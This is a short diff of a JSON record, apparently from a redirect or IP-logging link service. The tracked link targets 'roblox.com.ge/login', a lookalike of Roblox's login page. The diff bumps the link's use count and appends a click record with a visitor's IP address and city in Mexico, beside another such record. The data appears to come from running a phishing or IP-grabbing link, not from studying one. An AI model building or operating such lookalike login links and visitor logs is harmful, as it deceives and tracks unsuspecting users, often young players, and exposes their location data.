@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1228,
+    "useCount": 1229,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9966,6 +9966,14 @@
         "ip": "177.224.134.179",
         "country": "Mexico",
         "city": "Ciudad de Villa de Álvarez",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777327630278,
+        "ip": "189.198.158.5",
+        "country": "Mexico",
+        "city": "Querétaro City",
         "flag": "🇲🇽",
         "countryCode": "MX"
       }
